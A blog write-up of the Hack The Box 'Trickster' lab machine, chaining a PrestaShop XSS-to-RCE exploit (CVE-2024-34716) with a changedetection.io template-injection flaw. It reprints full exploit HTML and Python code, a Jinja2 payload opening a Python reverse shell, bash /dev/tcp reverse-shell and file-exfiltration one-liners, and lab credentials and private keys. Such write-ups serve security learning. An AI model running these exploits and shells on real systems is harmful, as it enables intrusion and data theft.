---
layout: post
title: "Trickster HTB writeup"
subtitle: "Walkethrough for the Trickster HTB machine."
date: 2024-09-28 23:45:13
background: '/img/posts/04.jpg'

---

## Report


Starting with the default `nmap` scan  

```bash
nmap $ip -sV
```
We get some output 

<br/> 
<img src="/img/trickster_screenshots/Screenshot_3.png" alt="1" style="width:700px; height:auto;">
<br/>

We get port `22 SSH` and `80 HTTP` with an `Apache` service running.  
Interacting with the `HTTP` service by opening the browser and type the `ip` address of the remote machine but we are redirected to a domain `trickster.htb`.

<br/> 
<img src="/img/trickster_screenshots/Screenshot_1.png" alt="1" style="width:700px; height:auto;">
<br/>

Adding the domain and map it to the `ip` address of the machine in the `/etc/hosts` file. 

<br/> 
<img src="/img/trickster_screenshots/Screenshot_2.png" alt="1" style="width:700px; height:auto;">
<br/>

We are welcomed with an `index` page.  

<br/> 
<img src="/img/trickster_screenshots/Screenshot_4.png" alt="1" style="width:700px; height:auto;">
<br/>

Following the standard methodology, checked the source code.  
A SubDomain can be found `shop.trickster.htb`.  

Adding it to `/etc/hosts` and open the page  

<br/> 
<img src="/img/trickster_screenshots/Screenshot_6.png" alt="1" style="width:700px; height:auto;">
<br/>

Doing some automation where `nikto` was used 

```bash
nikto -h trickster.htb
```

Nothing interesting was found 

<br/> 
<img src="/img/trickster_screenshots/Screenshot_7.png" alt="1" style="width:700px; height:auto;">
<br/>

Trying `directory bruteforcing` using `gobuster` with the `exclude-length` parameter as it was giving me an error code of page not found for all the directories I was trying to brute force.  

```bash
gobuster dir -u="http://trickster.htb/" -w=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt,zip,sh --exclude-length 278
```

Nothing interesting found  

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927102557.png" alt="1" style="width:700px; height:auto;">
<br/>

Redirecting my search to the new subdomain found.  
Checking source code, found nothing interesting.  
Checking the bottom of the page, found an application name.  

<br/> 
<img src="/img/trickster_screenshots/Screenshot_8.png" alt="1" style="width:700px; height:auto;">
<br/>  

`PrestaShop` can be identified but not the version yet.  

Running `nikto` again 

```bash
nikto -h shop.trickster.htb
```

Found some interesting findings 

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927104512.png" alt="1" style="width:700px; height:auto;">
<br/>

Found `/INSTALL.txt` file and a `/.git` directory referencing to a `GitHub` repository.  
Following `http://shop.trickster.htb/INSTALL.txt`, a version can now be identified 

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927105209.png" alt="1" style="width:700px; height:auto;">
<br/>

`PrestaShop version 8` found.  
Now going to the `/.git` directory 

<br/> 
<img src="/img/trickster_screenshots/Screenshot_10.png" alt="1" style="width:700px; height:auto;">
<br/>  

Dumping the files using `git-dumper `

```bash
git-dumper http://shop.trickster.htb/.git/ trickster_git
```

dumping all the files and folders  

<br/> 
<img src="/img/trickster_screenshots/Screenshot_12.png" alt="1" style="width:700px; height:auto;">
<br/>  

A weird directory called `admin634ewutrx1jgitlooaj` can be noted  

in the `.git/config` file, a potential username can be identified to be `adam` 

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927111228.png" alt="1" style="width:700px; height:auto;">
<br/>

Looking for public exploits, found this [link](https://github.com/aelmokhtar/CVE-2024-34716)  
Cloning the `repo` 

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927113006.png" alt="1" style="width:700px; height:auto;">
<br/>

We found 3 interesting files that needs to be adjusted

1. `ps_next_8_theme_malicious.zip`
2. `exploit.html `

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta viewport="width=device-width, initial-scale=1.0">
    <title>Exploit</title>
</head>
<body>
    <script>
        const baseUrl = 'http://prestashop:8000';
        const path = 'admin-dev';
        const httpServerIp = '172.16.27.179';
        const httpServerPort = 81;
        const fileNameOfTheme = "ps_next_8_theme_malicious.zip";

        async function fetchTokenFromHTML() {
            const url = `${baseUrl}/${path}/index.php/improve/design/themes/import`;
            try {
                const response = await fetch(url, {
                    method: 'GET',
                    credentials: 'include',
                    redirect: 'follow'
                });
                if (!response.ok) throw new Error('Failed to fetch the page for token extraction. Status: ' + response.status);

                const htmlText = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(htmlText, "text/html");

                const anchor = doc.querySelector('a.btn.btn-lg.btn-outline-danger.mr-3');
                const href = anchor ? anchor.getAttribute('href') : null;
                const match = href ? href.match(/_token=([^&]+)/) : null;
                const token = match ? match[1] : null;
                if (!token) throw new Error('Token not found in anchor tag href.');

                console.log('Extracted Token from HTML:', token);
                return token;
            } catch (error) {
                console.error('Error fetching token from HTML content:', error);
                return null;
            }
        }

        async function fetchCSRFToken(token) {
            const csrfUrl = `${baseUrl}/${path}/index.php/improve/design/themes/import?_token=${token}`;
            try {
                const response = await fetch(csrfUrl, {
                    method: 'GET',
                    credentials: 'include',
                    redirect: 'follow'
                });
                if (!response.ok) throw new Error('Failed to fetch the page for CSRF token extraction. Status: ' + response.status);

                const htmlText = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(htmlText, "text/html");

                const csrfTokenInput = doc.querySelector('input[name="import_theme[_token]"]');
                const csrfToken = csrfTokenInput ? csrfTokenInput.value : null;
                if (!csrfToken) throw new Error('CSRF token not found in HTML content.');

                console.log('Extracted CSRF Token:', csrfToken);
                return csrfToken;
            } catch (error) {
                console.error('Error fetching CSRF token:', error);
                return null;
            }
        }

        async function importTheme() {
            try {
                const locationHeaderToken = await fetchTokenFromHTML();
                if (!locationHeaderToken) {
                    console.error('Failed to fetch token from HTML');
                    return;
                }

                const csrfToken = await fetchCSRFToken(locationHeaderToken);
                if (!csrfToken) {
                    console.error('Failed to fetch CSRF token');
                    return;
                }

                const formData = new FormData();
                formData.append('import_theme[import_from_web]', `http://${httpServerIp}:${httpServerPort}/${fileNameOfTheme}`);
                formData.append('import_theme[_token]', csrfToken);

                const postUrl = `/${path}/index.php/improve/design/themes/import?_token=${locationHeaderToken}`;
                console.log('POST URL:', postUrl);

                const response = await fetch(postUrl, {
                    method: 'POST',
                    body: formData,
                });

                if (response.ok) {
                    console.log('Theme imported successfully');
                } else {
                    console.error('Failed to import theme. Response Status:', response.status);
                }
            } catch (error) {
                console.error('Error importing theme:', error);
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            importTheme();
        });
    </script>
</body>
</html>
```

3. `exploit.py`

```python
import argparse, requests, subprocess, time, threading, sys, http.server, socketserver
from bs4 import BeautifulSoup


print_lock = threading.Lock()
stop_event = threading.Event()

def usage():
    print("Usage: python script.py <host_url> <email> <message_content> <exploit_path>")
    print("")
    print("Options:")
    print("  host_url          The Presta Shop base url (e.g. http://prestashop:8000)")
    print("  email             The email address of admin user (e.g. admin@prestashop.com)")
    print("  message_content   Message to send in Contact Us form (e.g. 'Hello, I am exploiting you')")
    print("  exploit_path      The path of the exploit HTML (e.g. /path/to/exploit.html)")
    print("")
    print("Example:")
    print("  python exploit.py http://prestashop:8000 admin@example.com 'Hello, I am exploiting you' /path/to/exploit.html")


def __parse_args(argv):
    num_args = len(argv)

    if num_args == 1:
        host_url = input("[?] Please enter the URL (e.g., http://prestashop:8000): ")
        email = input("[?] Please enter your email: ")
        message_content = input("[?] Please enter your message: ")
        exploit_path = input("[?] Please provide the path to your HTML file: ")
    elif num_args < 5:
        usage()
        sys.exit(1)
    else:
        parser = argparse.ArgumentParser(description="CVE-2024-34716 Exploit")
        parser.add_argument("host_url", help="The Presta Shop base url.")
        parser.add_argument("email", help="The email address of admin user.")
        parser.add_argument("message_content", help="Message to send in Contact Us form.")
        parser.add_argument("exploit_path", help="The path of the exploit HTML.")

        args = parser.parse_args()

        host_url = args.host_url
        email = args.email
        message_content = args.message_content
        exploit_path = args.exploit_path

        print("[X] Starting exploit with:")
        print(f"\tUrl: {host_url}")
        print(f"\tEmail: {email}")
        print(f"\tMessage: {message_content}")
        print(f"\tExploit path: {exploit_path}")

    return (host_url, email, message_content, exploit_path)


def send_get_requests(url, interval=5):
    while not stop_event.is_set():
        try:
            response = requests.get(url)
            print(f"GET request to {url}: {response.status_code}")
        except requests.RequestException as e:
            with print_lock:
                print(f"Error during GET request: {e}") # Can comment this out if thread isn't stopped.
        time.sleep(interval)


def run_http_server():
    PORT = 5000
    with socketserver.TCPServer(("", PORT), CustomRequestHandler) as httpd:
        with print_lock:
            print("Serving at http.Server on port", PORT)
        while not stop_event.is_set():
            httpd.handle_request()


def main():
    host_url, email, message_content, exploit_path = __parse_args(sys.argv)

    with open(exploit_path, 'r') as file:
        html_content = file.read()

    url = f"{host_url}/contact-us"

    response = requests.get(url)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find('input', {'name': 'token'})['value']
    cookies = response.cookies

    files = {
        'fileUpload': ('test.png', html_content, 'image/png'),
    }

    data = {
        'id_contact': '2',
        'from': email,
        'message': message_content,
        'url': '',
        'token': token,
        'submitMessage': 'Send'
    }

    response = requests.post(url, files=files, data=data, cookies=cookies)
    url = f"{host_url}/themes/next/reverse_shell.php"

    req_thread = threading.Thread(target=send_get_requests, args=(url, 15,))
    req_thread.daemon = True
    req_thread.start()

    server_thread = threading.Thread(target=run_http_server)
    server_thread.daemon = True
    server_thread.start()

    if response.status_code == 200:
        print(f"[X] Yay! Your exploit was sent successfully!")
        print(f"[X] Remember to python http server on port whatever port is specified in exploit.html \n\tin directory that contains ps_next_8_theme_malicious.zip to host it.")
        print(f"[X] Once a CS agent clicks on attachment, you'll get a SHELL!")
        print("[X] Ncat is now listening on port 1234. Press Ctrl+C to terminate.")

        output = subprocess.call(["ncat", "-lnvp", "1667"], shell=False)
        if b"Ncat: Connection from " in output:
            with print_lock:
                print("Stopping threads!")
            stop_event.set()
        else:
            print(f"DEBUG:: {output}")
    else:
        print(f"[!] Failed to send the message. Status code: {response.status_code} Reason: {response.reason}")


class CustomRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_request(self, code='-', size='-'):
        with print_lock:
            print(f"Request: {self.command} {self.path} {self.request_version}")
            print(f"Response: {code} {size}")
        super().log_request(code, size)



if __name__ == "__main__":
    main()
```

Checking the instructions present on the video [here](https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/)
We need to change a couple of things:  
* Unzip the malicious theme present here
* Edit the `reverse_shell.php` file with our `IP` and `port` 
* zip the theme back.
* Open `exploit.html` and change a couple of things, first `BaseUrl` to `http://shop.trickster.htb`, `path` to `admin634ewutrx1jgitlooaj` (the directory name we found after dumping the git repo),`httpServerIp` to our `IP`, and `httpServerPort` to our `port` the one where we will be serving the `http` server.
* Create a new account on the platform and note the `email` as we will need it in the exploitation.

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927114253.png" alt="1" style="width:700px; height:auto;">
<br/>

Now serve the python server, open a `netcat` listener and run the exploit with the following parameters `python3 exploit.py base_app_url validEmail arbitrary_message path_of_exploit.html`  

```bash
python3 exploit.py http://shop.trickster.htb twilight@test.com hello exploit.html
```

We can see the exploit running 

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927124541.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking the `http` server

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927124602.png" alt="1" style="width:700px; height:auto;">
<br/>

We get a response  
Now checking the listener  

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927124631.png" alt="1" style="width:700px; height:auto;">
<br/>

We get a shell as `www-data`  
This shell is unstable so opened another listener and gave the `reverse shell` payload to catch another shell.

```bash
bash -c "/usr/bin/sh -i >& /dev/tcp/10.10.16.6/4445 0>&1"
```

We catch the new shell  

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927115620.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking the configuration file with path `/var/www/prestashop/app/config/parameters.php`  

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927120207.png" alt="1" style="width:700px; height:auto;">
<br/>

```php
<?php return array (
  'parameters' =>
  array (
    'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'prestashop',
    'database_user' => 'ps_user',
    'database_password' => 'prest@shop_o',
    'database_prefix' => 'ps_',
    'database_engine' => 'InnoDB',
    'mailer_transport' => 'smtp',
    'mailer_host' => '127.0.0.1',
    'mailer_user' => NULL,
    'mailer_password' => NULL,
    'secret' => 'eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog',
    'ps_caching' => 'CacheMemcache',
    'ps_cache_enable' => false,
    'ps_creation_date' => '2024-05-25',
    'locale' => 'en-US',
    'use_debug_toolbar' => true,
    'cookie_key' => '8PR6s1SJZLPCjXTegH7fXttSAXbG2h6wfCD3cLk5GpvkGAZ4K9hMXpxBxrf7s42i',
    'cookie_iv' => 'fQoIWUoOLU0hiM2VmI1KPY61DtUsUx8g',
    'new_cookie_key' => 'def000001a30bb7f2f22b0a7790f2268f8c634898e0e1d32444c3a03f4040bd5e8cb44bdb57a73f70e01cf83a38ec5d2ddc1741476e83c45f97f763e7491cc5e002aff47',
    'api_public_key' => '-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuSFQP3xrZccKbS/VGKMr
v8dF4IJh9F9NvmPZqiFNpJnBHhfWE3YVM/OrEREGKztkHFsQGUZXFIwiBQVs5kAG
5jfw+hQrl89+JRD0ogZ+OHUfN/CgmM2eq1H/gxAYfcRfwjSlOh2YzAwpLvwtYXBt
Scu6QqRAdotokqW2m3aMt+LV8ERdFsBkj+/OVdJ8oslvSt6Kgf39DnBpGIXAqaFc
QdMdq+1lT9oiby0exyUkl6aJU21STFZ7kCf0Secp2f9NoaKoBwC9m707C2UCNkAm
B2A2wxf88BDC7CtwazwDW9QXdF987RUzGj9UrEWwTwYEcJcV/hNB473bcytaJvY1
ZQIDAQAB
-----END PUBLIC KEY-----
',
    'api_private_key' => '-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC5IVA/fGtlxwpt
L9UYoyu/x0XggmH0X02+Y9mqIU2kmcEeF9YTdhUz86sREQYrO2QcWxAZRlcUjCIF
BWzmQAbmN/D6FCuXz34lEPSiBn44dR838KCYzZ6rUf+DEBh9xF/CNKU6HZjMDCku
/C1hcG1Jy7pCpEB2i2iSpbabdoy34tXwRF0WwGSP785V0nyiyW9K3oqB/f0OcGkY
hcCpoVxB0x2r7WVP2iJvLR7HJSSXpolTbVJMVnuQJ/RJ5ynZ/02hoqgHAL2bvTsL
ZQI2QCYHYDbDF/zwEMLsK3BrPANb1Bd0X3ztFTMaP1SsRbBPBgRwlxX+E0Hjvdtz
K1om9jVlAgMBAAECggEAD5CTdKL7TJVNdRyeZ/HgDcGtSFDt92PD34v5kuo14u7i
Y6tRXlWBNtr3uPmbcSsPIasuUVGupJWbjpyEKV+ctOJjKkNj3uGdE3S3fJ/bINgI
BeX/OpmfC3xbZSOHS5ulCWjvs1EltZIYLFEbZ6PSLHAqesvgd5cE9b9k+PEgp50Q
DivaH4PxfI7IKLlcWiq2mBrYwsWHIlcaN0Ys7h0RYn7OjhrPr8V/LyJLIlapBeQV
Geq6MswRO6OXfLs4Rzuw17S9nQ0PDi4OqsG6I2tm4Puq4kB5CzqQ8WfsMiz6zFU/
UIHnnv9jrqfHGYoq9g5rQWKyjxMTlKA8PnMiKzssiQKBgQDeamSzzG6fdtSlK8zC
TXHpssVQjbw9aIQYX6YaiApvsi8a6V5E8IesHqDnS+s+9vjrHew4rZ6Uy0uV9p2P
MAi3gd1Gl9mBQd36Dp53AWik29cxKPdvj92ZBiygtRgTyxWHQ7E6WwxeNUWwMR/i
4XoaSFyWK7v5Aoa59ECduzJm1wKBgQDVFaDVFgBS36r4fvmw4JUYAEo/u6do3Xq9
JQRALrEO9mdIsBjYs9N8gte/9FAijxCIprDzFFhgUxYFSoUexyRkt7fAsFpuSRgs
+Ksu4bKxkIQaa5pn2WNh1rdHq06KryC0iLbNii6eiHMyIDYKX9KpByaGDtmfrsRs
uxD9umhKIwKBgECAXl/+Q36feZ/FCga3ave5TpvD3vl4HAbthkBff5dQ93Q4hYw8
rTvvTf6F9900xo95CA6P21OPeYYuFRd3eK+vS7qzQvLHZValcrNUh0J4NvocxVVn
RX6hWcPpgOgMl1u49+bSjM2taV5lgLfNaBnDLoamfEcEwomfGjYkGcPVAoGBAILy
1rL84VgMslIiHipP6fAlBXwjQ19TdMFWRUV4LEFotdJavfo2kMpc0l/ZsYF7cAq6
fdX0c9dGWCsKP8LJWRk4OgmFlx1deCjy7KhT9W/fwv9Fj08wrj2LKXk20n6x3yRz
O/wWZk3wxvJQD0XS23Aav9b0u1LBoV68m1WCP+MHAoGBANwjGWnrY6TexCRzKdOQ
K/cEIFYczJn7IB/zbB1SEC19vRT5ps89Z25BOu/hCVRhVg9bb5QslLSGNPlmuEpo
HfSWR+q1UdaEfABY59ZsFSuhbqvC5gvRZVQ55bPLuja5mc/VvPIGT/BGY7lAdEbK
6SMIa53I2hJz4IMK4vc2Ssqq
-----END PRIVATE KEY-----
',
  ),
);
```

We can find some database credentials  
accessing the database 

```bash
mysql -u ps_user -p
```

Found an interesting database `prestashop`  

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927120327.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking the table `ps_employee`  

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927120458.png" alt="1" style="width:700px; height:auto;">
<br/>

A hash for user `james` was found.   
Saving the hash into a file and crack it using `hashcat`

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927191619.png" alt="1" style="width:700px; height:auto;">
<br/>

Credentials found `james:alwaysandforever`  
`SSH` into the machine with the discovered credentials 

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927191802.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking the `ip` addresses of the remote machines 

<br/> 
<img src="/img/trickster_screenshots/Screenshot_18.png" alt="1" style="width:700px; height:auto;">
<br/>

an interface pops out `docker0` with IP `172.17.0.1`

Writing a small one liner to sweep the network for live hosts 

```bash
for ip in {1..254}; do ping -c 1 -W 1 172.17.0.$ip &> /dev/null && echo "Host 172.17.0.$ip is up"; done
```

As we can see the output 

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927194523.png" alt="1" style="width:700px; height:auto;">
<br/>

2 hosts are up `172.17.0.1` which is the ip of our remote machine in the `docker0` interface and `172.0.0.2` an unknown host.  
Performing `Dynamic port forwarding` to forward the traffic from our Local machine using port `9050` to the remote machine and be able to reach this new host.  

```bash
ssh -D 9050 james@trickster.htb
```

Now edit the `/etc/proxychains.conf` and add this line  

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927195005.png" alt="1" style="width:700px; height:auto;">
<br/>

Now perform `nmap` scan on the new host using `proxychains`  

```bash
proxychains nmap 172.17.0.2 -sV
```

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927200203.png" alt="1" style="width:700px; height:auto;">
<br/>

We get  port `5000` open but with a weird output.  
From the readings we can deduce it is an `HTTP` page.   

Performing local port forwarding to be able to access this service from my Local machine.  

```bash
ssh -L 8080:172.17.0.2:5000 james@trickster.htb
```

Now access the service from browser on `http://127.0.0.1:8080`  

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927200650.png" alt="1" style="width:700px; height:auto;">
<br/>

`ChangeDetection` Service found with version `0.45.20` 
Trying `james`' password in `Password` textbox   

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927200813.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking for online exploits, found this [link](https://blog.hacktivesecurity.com/index.php/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/)  
It says that the service is vulnerable to `SSTI` (Server Side Template Injection) in the Notification Body.  
  
To reproduce, we will be following those steps:   
* Click on the `Edit` button on the first website we have on the `Index` page 

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927201423.png" alt="1" style="width:700px; height:auto;">
<br/>

* Click on `Notifications` button  

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927201444.png" alt="1" style="width:700px; height:auto;">
<br/>

* Serve a `python` server on port `8000` and write `get://local_machine_ip:PORT` in the `Notification URL` list  

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927202524.png" alt="1" style="width:700px; height:auto;">
<br/>

* Give a dummy title to the notification 
* In the notification Body we add this payload 

<pre><code>
# Calling os.popen without guessing the index of the class
&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;
  &#123;% if "warning" in x.__name__ %&#125;
    &#123;&#123;x()._module.__builtins__['__import__']('os').popen("ls").read()&#125;&#125;
  &#123;% endif %&#125;
&#123;% endfor %&#125;

&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;
  &#123;% if "warning" in x.__name__ %&#125;
    &#123;&#123;x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.6\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\"]);'").read().zfill(417)&#125;&#125;
  &#123;% endif %&#125;
&#123;% endfor %&#125;
</code></pre>

 `RCE` that opens a `reverse shell` using `jinja2` template payload.  
 
 <br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927204955.png" alt="1" style="width:700px; height:auto;">
<br/>

* Save the changes and select `Send test notification` 

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927205112.png" alt="1" style="width:700px; height:auto;">
<br/>
 
We get a response  

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927205135.png" alt="1" style="width:700px; height:auto;">
<br/>

This is an unstable shell so opened a new listener and caught the new shell 

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927205458.png" alt="1" style="width:700px; height:auto;">
<br/>

Upgraded the shell to a full `TTY` shell with the following commands   

```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

```bash
export TERM=xterm-256color
```

Checking the history  

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927205714.png" alt="1" style="width:700px; height:auto;">
<br/>

We get a very weird command that should be noted `#YouC4ntCatchMe#`  

Checking the `root` `/` directory  

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927211434.png" alt="1" style="width:700px; height:auto;">
<br/>

Following the path `datastore/Backups/` , we found 2 interesting zip files 

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927211621.png" alt="1" style="width:700px; height:auto;">
<br/>

Sending them to my local machine using this trick 

```bash
cat changedetection-backup-20240830194841.zip >& /dev/tcp/10.10.16.6/5555 0>&1
```

```bash
cat changedetection-backup-20240830202524.zip >& /dev/tcp/10.10.16.6/5555 0>&1
```

We get the files  

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927212330.png" alt="1" style="width:700px; height:auto;">
<br/>

unzip the first file 

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927212449.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking the `.br` file, it is a `Brotli` encoded file.  
Using this [link](https://myl.moe/brotli/)  to decode it, we get this output 

```text
  This website requires JavaScript.
    Explore Help
    Register Sign In
                james/prestashop
              Watch 1
              Star 0
              Fork 0
                You've already forked prestashop
          Code Issues Pull Requests Actions Packages Projects Releases Wiki Activity
                main
          prestashop / app / config / parameters.php
            james 8ee5eaf0bb prestashop
            2024-08-30 20:35:25 +01:00

              64 lines
              3.1 KiB
              PHP

            Raw Permalink Blame History

                < ? php return array (
                'parameters' =>
                array (
                'database_host' => '127.0.0.1' ,
                'database_port' => '' ,
                'database_name' => 'prestashop' ,
                'database_user' => 'adam' ,
                'database_password' => 'adam_admin992' ,
                'database_prefix' => 'ps_' ,
                'database_engine' => 'InnoDB' ,
                'mailer_transport' => 'smtp' ,
                'mailer_host' => '127.0.0.1' ,
                'mailer_user' => NULL ,
                'mailer_password' => NULL ,
                'secret' => 'eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog' ,
                'ps_caching' => 'CacheMemcache' ,
                'ps_cache_enable' => false ,
                'ps_creation_date' => '2024-05-25' ,
                'locale' => 'en-US' ,
                'use_debug_toolbar' => true ,
                'cookie_key' => '8PR6s1SCD3cLk5GpvkGAZ4K9hMXpx2h6wfCD3cLk5GpvkGAZ4K9hMXpxBxrf7s42i' ,
                'cookie_iv' => 'fQoIWUoOLU0hiM2VmI1KPY61DtUsUx8g' ,
                'new_cookie_key' => `def000001a30bb7f2f22b0a7790f2268f8c634898e0e1d32444c3a03fbb7f2fb57a73f70e01cf83a38ec5d2ddc1741476e83c45f97f763e7491cc5e002aff47' ,
                'api_public_key' => '-----BEGIN PUBLIC KEY-----
                MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuSFQP3xrZccKbS/VGKMr
                v8dF4IJh9F9NvmPZqiFNpJnBHhfWE3YVM/OrEREGKztkHFsQGUZXFIwiBQVs5kAG
                5jfw+hQrl89+JRD0ogZ+OHUfN/CgmM2eq1H/gxAYfcRfwjSlOh2YzAwpLvwtYXBt
                Scu6QqRAdotokqW2meozijOIJFPFPkpoFKPdVdJ8oslvSt6Kgf39DnBpGIXAqaFc
                QdMdq+1lT9oiby0exyUkl6aJU21STFZ7kCf0Secp2f9NoaKoBwC9m707C2UCNkAm
                B2A2wxf88BDC7CtwazwDW9QXdF987RUzGj9UrEWwTwYEcJcV/hNB473bcytaJvY1
                ZQIDAQAB
                -----END PUBLIC KEY-----
                ' ,
                'api_private_key' => '-----BEGIN PRIVATE KEY-----
                MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC5IVA/fGtlxwpt
                L9UYoyu/x0XggmH0X02+Y9mqIU2kmcEeF9YTdhUz86sREQYrO2QcWxAZRlcUjCIF
                BWzmQAbmN/D6FCuXz34lEPSiBn44dR838KCYzZ6rUf+DEBh9xF/CNKU6HZjMDCku
                /C1hcG1Jy7pCpEB2i2iSpbabdoy34tXwRF0WwGSP785V0nyiyW9K3oqB/f0OcGkY
                hcCpoVxB0x2r7WVP2iJvLR7HJSSXpolTbVJMVnuQJ/RJ5ynZ/02hoqgHAL2bvTsL
                ZQI2QCYHYDbDF/zwEMLsK3BrPANb1Bd0X3ztFTMaP1SsRbBPBgRwlxX+E0Hjvdtz
                K1om9jVlAgMBAAECggEAD5CTdKL7TJVNdRyeZ/HgDcGtSFDt92PD34v5kuo14u7i
                Y6tRXlWBNtr3uPmbcSsPIasuUVGupJWbjpyEKV+ctOJjKkNj3uGdE3S3fJ/bINgI
                BeX/OpmfC3xbZSOHS5ulCWjvs1EltZIYLFEbZ6PSLHAqesvgd5cE9b9k+PEgp50Q
                DivaH4PxfI7IKLlcWiq2mBrYwsWHIlcaN0Ys7h0RYn7OjhrPr8V/LyJLIlapBeQV
                Geq6MswRO6OXfLs4Rzuw1dedDPdDZFdSaef6I2tm4Puq4kB5CzqQ8WfsMiz6zFU/
                UIHnnv9jrqfHGYoq9g5rQWKyjxMTlKA8PnMiKzssiQKBgQDeamSzzG6fdtSlK8zC
                TXHpssVQjbw9aIQYX6YaiApvsi8a6V5E8IesHqDnS+s+9vjrHew4rZ6Uy0uV9p2P
                MAi3gd1Gl9mBQd36Dp53AWik29cxKPdvj92ZBiygtRgTyxWHQ7E6WwxeNUWwMR/i
                4XoaSFyWK7v5Aoa59ECduzJm1wKBgQDVFaDVFgBS36r4fvmw4JUYAEo/u6do3Xq9
                JQRALrEO9mdIsBjYs9N8gte/9FAijxCIprDzFFhgUxYFSoUexyRkt7fAsFpuSRgs
                +Ksu4bKxkIQaa5pn2WNh1rdHq06KryC0iLbNii6eiHMyIDYKX9KpByaGDtmfrsRs
                uxD9umhKIwKBgECAXl/+Q36feZ/FCga3ave5TpvD3vl4HAbthkBff5dQ93Q4hYw8
                rTvvTf6F9900xo95CA6P21OPeYYuFRd3eK+vS7qzQvLHZValcrNUh0J4NvocxVVn
                RX6hWcPpgOgMl1u49+bSjM2taV5lgLfNaBnDLoamfEcEwomfGjYkGcPVAoGBAILy
                1rL84VgMslIiHipP6fAlBXwjQ19TdMFWRUV4LEFotdJavfo2kMpc0l/ZsYF7cAq6
                fdX0c9dGWCsKP8LJWRk4OgmFlx1deCjy7KhT9W/fwv9Fj08wrj2LKXk20n6x3yRz
                O/wWZk3wxvJQD0XS23Aav9b0u1LBoV68m1WCP+MHAoGBANwjGWnrY6TexCRzKdOQ
                K/cEIFYczJn7IB/zbB1SEC19vRT5ps89Z25BOu/hCVRhVg9bb5QslLSGNPlmuEpo
                HfSWR+q1UdaEfABY59ZsFSuhbqvC5gvRZVQ55bPLuja5mc/VvPIGT/BGY7lAdEbK
                6SMIa53I2hJz4IMK4vc2Ssqq
                -----END PRIVATE KEY-----
                ' ,
                ),
                );

                Reference in New Issue View Git Blame Copy Permalink
    Powered by Gitea Version: 1.22.1 Page: 158ms Template: 14ms
      English
        Bahasa Indonesia Deutsch English Español Français Italiano Latviešu Magyar nyelv Nederlands Polski Português de Portugal Português do Brasil Suomi Svenska Türkçe Čeština Ελληνικά Български Русский Українська فارسی മലയാളം 日本語 简体中文 繁體中文（台灣） 繁體中文（香港） 한국어
    Licenses API
```

we can identify some credentials `adam:adam_admin992`  
Trying the new credentials found 

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927212907.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking `sudo` permissions  

<br/> 
<img src="/img/trickster_screenshots/Pasted image 20240927212929.png" alt="1" style="width:700px; height:auto;">
<br/>

